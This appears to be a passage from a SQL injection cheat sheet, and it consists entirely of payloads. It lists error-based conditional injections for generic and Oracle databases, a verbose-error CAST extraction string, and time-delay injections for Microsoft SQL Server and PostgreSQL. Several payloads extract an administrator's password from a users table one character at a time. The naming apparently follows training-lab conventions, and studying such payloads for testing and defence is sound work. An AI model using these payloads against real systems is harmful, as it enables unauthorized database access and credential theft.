	' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
	' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
	' AND (SELECT CASE WHEN (LENGTH(password)>1) THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')='a
	' AND (SELECT CASE WHEN (SUBSTR(password,15,1)='a') THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')='a
## Oracle databases

	'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
	'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
	'||(SELECT CASE WHEN (payload) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
	
	'|| (SELECT CASE WHEN (SUBSTR(password,15,1)='a') THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator') ||'
	'|| (SELECT CASE WHEN (length(password)>1) THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator') ||'

## Extracting sensitive data via verbose SQL error messages
	' and 1=CAST((SELECT example_column FROM example_table) AS int)-- -

## Exploiting blind SQL injection by triggering time delays
#### Microsoft SQL Server
	'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND (LENGTH(password)>1) = 1 WAITFOR DELAY '0:0:{delay}'--
	'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

	';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

	;SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
	;SELECT CASE WHEN (username='administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--